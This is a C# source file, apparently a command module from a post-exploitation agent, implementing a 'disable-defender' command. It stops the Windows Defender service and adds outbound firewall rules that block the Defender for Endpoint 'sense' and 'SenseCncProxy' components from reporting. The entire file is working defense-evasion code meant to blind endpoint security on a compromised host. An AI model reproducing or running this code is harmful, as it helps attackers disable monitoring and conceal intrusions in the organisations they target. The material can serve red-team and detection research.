using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using NetFwTypeLib;
namespace Agent.Commands
{

    class DisableDefenderForEndpoint : AgentCommand
    {
        public override string Name => "disable-defender";

        public override string Execute(AgentTask task)
        {
            try
            {
                ExecuteFirewallBlock();
                if (!Internal.Services.StopWinDefend())
                    return "Failed to stop windefend, check permissions (need trusted installer)";
                ExecuteFirewallBlock();
                Native.Advapi.RevertToSelf();
                return "Successfully disabled defender";
            }
            catch
            {
                Native.Advapi.RevertToSelf();
                return "Failed to disable defender, check permissions (need trusted installer)";
            }
        }

        public static void ExecuteFirewallBlock()
        {
            AddBlockRule("windefend", "windefendBlocker", "windefend");
            AddBlockRule("senseCncProxy", "senseCncProxyBlocker", "", "%ProgramFiles%\\Windows Defender Advanced Threat Protection\\SenseCncProxy.exe");
            AddBlockRule("sense", "senseblocker", "sense");
        }
        public static bool AddBlockRule(string description, string ruleName, string serviceName = "", string fullPath = "")
        {
            if (fullPath == "")
            {
                // rule by service name
                INetFwRule firewallRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
                INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWPolicy2"));
                firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_BLOCK;
                firewallRule.Description = description;
                firewallRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
                firewallRule.Enabled = true;
                firewallRule.serviceName = serviceName;
                firewallRule.InterfaceTypes = "All";
                firewallRule.Name = ruleName;
                //firewallRule.ApplicationName = fullPath;
                firewallPolicy.Rules.Add(firewallRule);
                return true;
            }
            else
            {
                // rule by fullpath
                INetFwRule firewallRule = (INetFwRule)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWRule"));
                INetFwPolicy2 firewallPolicy = (INetFwPolicy2)Activator.CreateInstance(Type.GetTypeFromProgID("HNetCfg.FWPolicy2"));
                firewallRule.Action = NET_FW_ACTION_.NET_FW_ACTION_BLOCK;
                firewallRule.Description = description;
                firewallRule.Direction = NET_FW_RULE_DIRECTION_.NET_FW_RULE_DIR_OUT;
                firewallRule.Enabled = true;
                //firewallRule.serviceName = serviceName;
                firewallRule.InterfaceTypes = "All";
                firewallRule.Name = ruleName;
                firewallRule.ApplicationName = fullPath;
                firewallPolicy.Rules.Add(firewallRule);
                return true;
            }
        }
    }
}
